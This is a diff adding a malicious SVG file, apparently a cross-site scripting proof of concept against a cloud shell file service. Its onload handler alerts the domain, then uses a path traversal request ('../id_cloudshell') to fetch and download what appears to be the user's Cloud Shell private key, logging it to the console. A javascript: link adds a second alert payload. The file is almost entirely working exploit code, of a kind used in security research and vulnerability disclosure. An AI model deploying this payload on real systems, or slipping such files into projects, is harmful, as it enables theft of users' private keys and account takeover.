@@ -1,0 +1,19 @@
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg onload="{ 
+    var container_url = 'https://' + location.host + '/files/?uri=../id_cloudshell'; 
+    alert(document.domain + '\n\ncheck your console log');
+    console.log(container_url); 
+    fetch(container_url) 
+        .then(
+            response => console.log(response.json()
+            .then(data => 
+                     fetch('https://'+location.host+'/files/download/?id='+data.id)
+                        .then(response => console.log(response.text())) 
+                 )
+            )
+        ) 
+}" oid="circle" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+	<a xlink:href="javascript:alert(document.domain)" version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+	<circle  cx="225" cy="125" r="100" stroke="black" stroke-width="3a"> </circle>
+	</a>
+</svg>
